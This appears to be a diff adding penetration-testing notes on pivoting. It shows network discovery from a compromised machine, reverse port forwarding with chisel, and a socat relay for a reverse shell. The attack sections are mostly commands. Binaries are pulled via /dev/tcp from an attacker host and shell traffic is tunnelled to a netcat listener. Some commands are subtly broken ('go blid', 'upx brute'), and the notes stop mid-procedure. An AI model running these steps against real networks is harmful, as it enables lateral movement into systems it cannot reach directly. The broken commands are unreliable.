@@ -1,0 +1,127 @@
+# Pivoting {-}
+
+**Pivoting** is a technic that comes when attacker already took access to a first victim and see that this victim machine have access to other machines that attacker can
+not connect to. Let's see an example:
+
+Attacker gain access to the machine 10.10.10.10 and looking at his ifconfig he see someting like the following:
+
+```bash
+enp0s10f1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.10  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::7e8c:6a7c:faf1:274c  prefixlen 64  scopeid 0x20<link>
+        ether 54:e1:ad:79:27:80  txqueuelen 1000  (Ethernet)
+        RX packets 7463931  bytes 10268193539 (10.2 GB)
+        RX errors 0  dropped 11149  overruns 0  frame 0
+        TX packets 3581258  bytes 306664252 (306.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        device interrupt 16  memory 0xec200000-ec220000  
+
+enp0s20f2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 20.20.20.10  netmask 255.255.255.0  broadcast 20.20.20.255
+        inet6 fe80::7e8c:6a7c:faf1:274c  prefixlen 64  scopeid 0x20<link>
+        ether 54:e1:ad:79:27:80  txqueuelen 1000  (Ethernet)
+        RX packets 7463931  bytes 10268193539 (10.2 GB)
+        RX errors 0  dropped 11149  overruns 0  frame 0
+        TX packets 3581258  bytes 306664252 (306.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        device interrupt 16  memory 0xec200000-ec220000  
+```
+
+At this moment attacker try to ping the victim machine at his second ip (20.20.20.20) and the ping don't respond. That's because Attacker don't have access to this network.
+The only way he have is to use the victim machine to do a network discovery for the 20.20.20.0/24 network. On the victim machine he can for example do a 
+`fping -a -g 20.20.20.0/24 2>/dev/null` or a `nmap -sn 20.20.20.0/24` (also a personal script if no other possiblity exists). 
+Attacker see that another machine exists in this network segment. The 20.20.20.20 has been discovered with port 80 and 22. Because Attacker can not access to this machine,
+he have to use the 10.10.10.10 to make a reverse port forwarding of the 20.20.20.20:80 and 20.20.20.20:22 to the ports of the attacker machine. That's pivoting
+
+Here for the notes we will have special nomenclature:  
+
+- 20.20.20.20 -> **victim machine**  
+- 10.10.10.10 -> **pivoting machine**  
+- attacker -> **attacker machine**  
+
+
+## Pivoting with chisel {-}
+
+1. Get chisel and build  
+
+    ```bash
+    git clone https://github.com/jpillora/chisel
+    cd chisel
+    go blid -ldflags "-s -w" .
+    upx brute chisel
+    ```
+
+1. Send Chisel binary to the pivoting machine  
+
+    - on attacker machine  
+
+        ```bash
+        md5sum chisel
+        nc -nlvp 443 < chisel
+        ```
+    
+    - on pivoting machine  
+
+        ```bash
+        cat > chisel < /dev/tcp/<attacker ip>/443
+        md5sum chisel
+        chmod +x chisel
+        ```
+
+1. Create reverse port forwarding with the victim machine ports to bind attacker machine ports  
+
+    - on attacker machine  
+
+        ```bash
+        ./chisel server --reverse -p 1234
+        ```
+    
+    - on pivoting machine  
+
+        ```bash
+        ./chisel client <attacker ip>:1234 R:127.0.0.1:80:<victim ip>:80 R:127.0.0.1:222:<victim ip>:22
+        ```
+
+1. Now attacker can check the web app on localhost:80 or use the ssh to 127.0.0.1 -p 222
+
+## Pivoting with socat {-}
+
+1. Get socat static binary  
+
+    ```bash
+    wget https://github.com/aledbf/socat-static-binary/releases/download/v.0.0.1/socat-linux-amd64
+    ```
+
+1. Send sockat to pivoting machine  
+
+    - on attacker machine  
+
+        ```bash
+        md5sum socat
+        nc -nlvp 1111 < socat
+        ```
+    
+    - on pivotin machine  
+
+        ```bash
+        cat > socat < /dev/tcp/<attacker ip>/1111
+        md5sum socat
+        chmod +x socat
+        ```
+
+1. Prepare attacker machine for listenning  
+
+    ```bash
+    nc -nlvp 7979
+    ```
+
+1. Tuneling tcp data for reverse shell from victim to the attacker  
+
+    - on pivoting machine  
+
+    ```bash
+    ./socat TCP-LISTEN:4545,fork tcp:<attacker ip>:7979 &
+    ```
+
+1. Reverse shell from victim to pivoting machine on 4545 port  
+
